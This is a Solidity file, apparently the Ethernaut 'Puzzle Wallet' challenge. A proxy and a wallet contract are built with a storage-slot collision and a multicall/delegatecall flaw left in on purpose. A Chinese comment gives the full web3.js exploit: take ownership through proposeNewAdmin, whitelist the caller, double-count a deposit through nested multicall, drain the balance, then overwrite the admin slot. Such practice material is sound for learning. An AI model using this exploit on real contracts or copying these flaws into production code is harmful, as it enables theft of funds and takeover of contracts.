// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

/**
    1、proxy的pendingAdmin和implementation合约中的owner冲突，修改proxy合约中pendingAdmin时，owner会被修改，
        调用proposeNewAdmin成为implementation的owner
   await web3.eth.sendTransaction({
        from: player,
        to: contract.address, 
        data: web3.eth.abi.encodeFunctionSignature("proposeNewAdmin(address)")+
        web3.eth.abi.encodeParameter("address", player).replace('0x', '')
    })
    
    2、调用implementation的addToWhitelist成为白名单
        await contract.addToWhitelist(player)
    3、通过覆盖maxBalance值来达到修改proxy中admin的目的
      setMaxBalance需要将合约中的余额清空，清空余额则需要在player账户实际存入0.001ether的情况下balance计入0.002，
      该目的可以通过循环multicall->deposit->multicall->deposit来实现
      var depositData = web3.eth.abi.encodeFunctionCall({
        name: 'deposit',
        type: 'function',
        inputs: []
      }, []);
      var multicallData = web3.eth.abi.encodeFunctionCall({
    name: 'multicall',
    type: 'function',
    inputs: [{
        type: 'bytes[]',
        name: 'data'
    }]
}, [[depositData]]);
var nestedMulticallData = web3.eth.abi.encodeFunctionCall({
    name: 'multicall',
    type: 'function',
    inputs: [{
        type: 'bytes[]',
        name: 'data'
    }]
}, [[depositData, multicallData]]);
await web3.eth.sendTransaction({
    to: instance,
    from: player,
    value: "1000000000000000",
    data: nestedMulticallData
})
    await contract.execute(player, 2000000000000000, 0x00);
    await contract.setMaxBalance(uint256(player))
*/
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}